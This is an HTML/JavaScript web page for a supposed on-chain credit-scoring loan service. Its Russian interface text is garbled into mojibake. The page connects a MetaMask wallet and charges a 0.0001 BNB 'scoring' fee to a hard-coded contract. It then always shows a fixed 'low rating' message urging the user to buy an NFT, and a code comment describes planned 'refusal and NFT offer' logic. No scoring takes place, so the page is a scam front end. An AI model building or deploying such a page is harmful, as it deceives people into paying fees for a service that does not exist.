<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit Scoring on-chain</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { 
            --accent: #00f2ff; --bg: #030308; --card: #0d0d1a; --text-main: #ffffff;
            --text-dim: #a0a0b8; --success: #00ff88; --error: #ff0055;
        }
        body { background: var(--bg); color: var(--text-main); font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background-image: radial-gradient(circle at 50% 50%, #1a1a3a 0%, #030308 100%); }
        .container { background: var(--card); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 28px; padding: 40px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.8); }
        h1 { font-size: 26px; font-weight: 800; background: linear-gradient(135deg, #fff 0%, var(--accent) 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .range-container { margin: 20px 0; text-align: left; }
        .amount-display { font-size: 28px; font-weight: 800; color: var(--accent); text-align: center; margin-bottom: 12px; }
        input[type=range] { width: 100%; -webkit-appearance: none; background: rgba(255,255,255,0.1); height: 6px; border-radius: 5px; outline: none; }
        input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; width: 18px; height: 18px; background: var(--accent); border-radius: 50%; cursor: pointer; }
        .btn { background: var(--accent); color: #000; border: none; padding: 18px; border-radius: 16px; font-weight: 700; cursor: pointer; width: 100%; font-size: 16px; margin-top: 10px; }
        .status-msg { font-size: 13px; margin-top: 20px; min-height: 20px; }
        .dashboard { margin-top: 10px; padding: 20px; border-radius: 20px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); }
    </style>
</head>
<body>

<div class="container">
    <div style="font-size: 50px; margin-bottom: 15px;">üè¶</div>
    <h1>Credit Scoring on-chain</h1>

    <div id="authSection">
        <button id="connBtn" class="btn" onclick="connect()">–ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª–µ–∫</button>
    </div>
    
    <div id="dashboard" class="dashboard" style="display:none;">
        <div class="range-container">
            <div class="amount-display" id="amountVal">$500</div>
            <input type="range" id="amountSlider" min="100" max="1000" step="50" value="500" oninput="updateUI()">
        </div>
        <button id="actionBtn" class="btn" onclick="processCredit()">–ó–∞–ø—Ä–æ—Å–∏—Ç—å –∫—Ä–µ–¥–∏—Ç</button>
        <div style="font-size: 11px; color: #555; margin-top: 12px; text-align: center;">–ê–Ω–∞–ª–∏–∑ –ø—Ä–æ—Ñ–∏–ª—è: 0.0001 BNB</div>
    </div>

    <div id="status" class="status-msg"></div>
</div>

<script>
    // –¢–í–û–ô –ö–û–ù–¢–†–ê–ö–¢
    const CONTRACT_ADDR = "0x322Eb1161AF0d93E65A987714fBe87e2CbeBc459"; 
    let signer;

    function updateUI() {
        const amount = document.getElementById('amountSlider').value;
        document.getElementById('amountVal').innerText = "$" + amount;
    }

    async function connect() {
        if (window.ethereum) {
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const accounts = await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                document.getElementById('authSection').style.display = "none";
                document.getElementById('dashboard').style.display = "block";
                showStatus("–ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω", "#00ff88");
            } catch (e) { showStatus("–û—à–∏–±–∫–∞ –≤—Ö–æ–¥–∞", "#ff0055"); }
        } else { alert("MetaMask –Ω–µ –Ω–∞–π–¥–µ–Ω!"); }
    }

    async function processCredit() {
        try {
            showStatus("–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –æ–ø–ª–∞—Ç—É 0.0001 BNB...", "#fff");
            const contract = new ethers.Contract(CONTRACT_ADDR, ["function payScoring() payable"], signer);
            const tx = await contract.payScoring({ value: ethers.utils.parseEther("0.0001") });
            await tx.wait();
            showStatus("–û–ø–ª–∞—á–µ–Ω–æ! –ò–¥–µ—Ç –∞–Ω–∞–ª–∏–∑...", "#00f2ff");
            
            // –ó–¥–µ—Å—å –¥–∞–ª—å—à–µ –±—É–¥–µ—Ç –ª–æ–≥–∏–∫–∞ –æ—Ç–∫–∞–∑–∞ –∏ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏—è NFT
            setTimeout(() => { alert("–ù–∏–∑–∫–∏–π —Ä–µ–π—Ç–∏–Ω–≥! –ö—É–ø–∏—Ç–µ NFT –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –ª–∏–º–∏—Ç–∞."); }, 2000);
        } catch (e) { showStatus("–û—à–∏–±–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏", "#ff0055"); }
    }

    function showStatus(text, color) {
        const s = document.getElementById('status');
        s.innerHTML = text;
        s.style.color = color;
    }
</script>
</body>
</html>
